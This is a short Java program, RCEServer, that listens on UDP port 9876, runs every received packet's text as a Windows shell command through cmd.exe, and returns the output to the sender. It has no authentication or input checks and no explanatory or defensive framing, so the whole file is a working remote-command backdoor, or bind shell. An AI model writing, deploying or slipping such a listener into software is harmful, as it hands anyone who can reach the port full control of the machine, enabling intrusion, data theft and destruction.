import java.io.*;
import java.net.*;

public class RCEServer {
    public static void main(String[] args) {
        try {
            int serverPort = 9876;
            DatagramSocket serverSocket = new DatagramSocket(serverPort);
            
            System.out.println("Server is running...");
            
            while (true) {
                byte[] receiveData = new byte[1024];
                DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
                serverSocket.receive(receivePacket);
                
                String command = new String(receivePacket.getData(), 0, receivePacket.getLength());
                
                System.out.println("Received command: " + command);
                
                // Execute the command and get the result
                String result = executeCommand(command);
                
                InetAddress clientAddress = receivePacket.getAddress();
                int clientPort = receivePacket.getPort();
                
                byte[] sendData = result.getBytes();
                
                DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, clientAddress, clientPort);
                serverSocket.send(sendPacket);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    private static String executeCommand(String command) {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/C", command);
            processBuilder.redirectErrorStream(true); // Redirect error stream to input stream
    
            Process process = processBuilder.start();
    
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
    
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
    
            int exitCode = process.waitFor(); // Wait for the command to complete
    
            if (exitCode == 0) {
                return output.toString();
            } else {
                return "Command execution failed with exit code " + exitCode;
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
            return "Command execution failed: " + e.getMessage();
        }
    }
    
}
